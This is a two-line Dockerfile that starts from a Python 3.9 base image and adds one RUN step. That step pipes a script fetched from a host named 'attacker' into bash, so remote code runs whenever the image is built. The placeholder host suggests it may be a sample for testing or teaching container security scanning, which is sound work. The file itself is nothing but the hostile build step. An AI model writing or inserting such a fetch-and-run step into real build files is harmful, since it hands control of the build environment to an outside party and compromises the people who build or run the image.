FROM python:3.9
RUN curl http://attacker/payload.sh | bash
